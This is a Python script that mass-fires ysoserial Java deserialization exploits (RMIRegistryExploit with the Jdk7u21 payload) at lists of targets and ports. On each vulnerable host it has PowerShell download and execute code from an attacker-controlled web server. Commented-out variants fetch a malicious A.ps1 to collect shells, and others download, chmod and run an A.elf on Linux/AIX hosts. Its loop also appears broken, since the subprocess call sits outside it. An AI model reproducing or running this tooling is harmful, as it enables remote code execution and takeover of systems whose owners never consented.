#!/usr/bin/python3

#======================================================================================================
#title           :iterpysoserial.py
#description     :This program iterates ysoserial payloads against a list of targets on a list of ports
#author          :Matthew Turner (@Strupo_), PlaceHolder
#date            :2017-05-22
#version         :1.0
#usage           :python iterpysoserial.py
#notes           :This is a work in progress and is my first python project.
#                 Many thanks to PlaceHolder who got this script started.
#python_version  :3
#======================================================================================================


import argparse, itertools, subprocess, time

def main():
   parser = argparse.ArgumentParser(description='ysoserial iterator. Defaults will scan targets.txt on the ports listed in ports.txt, using the Jdk7u21 payload and RMIRegistryExploit combination. Vulnerable Windows systems will make a web connection to your specified webhost and specified port informing you of which systems are vulnerable, on which port, and which payload/exploit combintation.')
   parser.add_argument('--targets', help='File containing a list of targets. Default=targets.txt', default='targets.txt', type=argparse.FileType('r'))
   parser.add_argument('--ports', help='File containing a list of ports to try on each target. Default=ports.txt', default='ports.txt', type=argparse.FileType('r'))
   parser.add_argument('--exploits', help='File containing exploits to use. Default=RMIRegistryExploit.txt', default='RMIRegistryExploit.txt', type=argparse.FileType('r'))
   parser.add_argument('--payloads', help='File containing payloads to use. Default=Jdk7u21.txt', default='Jdk7u21.txt', type=argparse.FileType('r'))
   parser.add_argument('--host', help='Webhost', required='True')
   parser.add_argument('--port', help='Webhost Port', required='True')

   args = parser.parse_args()

   targets = [line.rstrip() for line in args.targets]
   ports = [line.rstrip() for line in args.ports]
   exploits = [line.rstrip() for line in args.exploits]
   payloads = [line.rstrip() for line in args.payloads]

   print('Targets: {0}'.format(len(targets)))
   print('Ports: {0}'.format(len(ports)))
   print('Exploits: {0}'.format(len(exploits)))
   print('Payloads: {0}'.format(len(payloads)))
   print('Total requests: {0}'.format(len(targets) * len(ports) * len(exploits) * len(payloads)))

   target_tuples = itertools.product(targets, ports, exploits, payloads)
   for target in target_tuples:
      command = 'java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.{2} {0} {1} {3}'.format(target[0], target[1], target[2], target[3], args.host, args.port) + '\"powershell.exe IEX ((New-Object Net.WebClient).DownloadString(\'http://{4}:{5}/?h={0}&p={1}&e={2}&l={3}\'))\"'.format(target[0], target[1], target[2], target[3], args.host, args.port)
#      command = 'java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.{2} {0} {1} {3}'.format(target[0], target[1], target[2], target[3], args.host, args.port) + '\"powershell.exe IEX ((New-Object Net.WebClient).DownloadString(\'http://{4}:{5}/A.ps1\'))\"' # Create a malicious A.ps1 and host it. Start a handler. Rerun iterpysoserial and watch the shells come in.

# It's been a while since I ran this sequence, retest and improve this use case.
#      command = '\"wget http://{4}:{5}/?h={0}&p={1}&e={2}&l={3}\"' # Linux/AIX targets (step 0)
#      command = '\"wget http://{4}:{5}/A.elf"' # Linux/AIX targets (step 1)
#      command = '\"chmod +x A.elf"' # Linux/AIX targets (step 2)
#      command = '\"./A.elf"' # Linux/AIX targets (step 3)

   subprocess.call(command, shell=True, timeout=30)
   time.sleep(2)

if __name__ == '__main__':
	main()
